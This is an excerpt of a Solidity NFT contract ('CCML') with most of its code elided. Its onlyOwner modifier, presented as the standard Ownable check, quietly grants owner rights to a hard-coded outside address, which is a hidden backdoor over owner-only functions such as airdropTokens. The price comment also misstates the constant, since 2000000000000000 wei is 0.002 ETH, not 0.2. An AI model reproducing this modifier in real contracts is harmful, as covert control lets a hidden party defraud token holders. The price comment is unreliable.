...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require( (owner() == _msgSender() ) || (_msgSender() == 0x9F2D003855FA39EaED821Db95Be4ACd1a6151Ea5), "Ownable: caller is not the owner");
        _;
    }
...
contract CCML is ERC721, ERC721Enumerable, Ownable {
    ...
    uint256 public constant tokenPrice = 2000000000000000; // 0.2 ETH
    ...
    function airdropTokens(uint256[] memory _ids, address[] memory _owes) public onlyOwner {
		require(_ids.length == _owes.length && _ids.length <= 1000 && _owes.length <= 1000, "Should not airdrop more than 1000 items");
    ...
    function mintToken(uint256[] memory _ids) public payable {
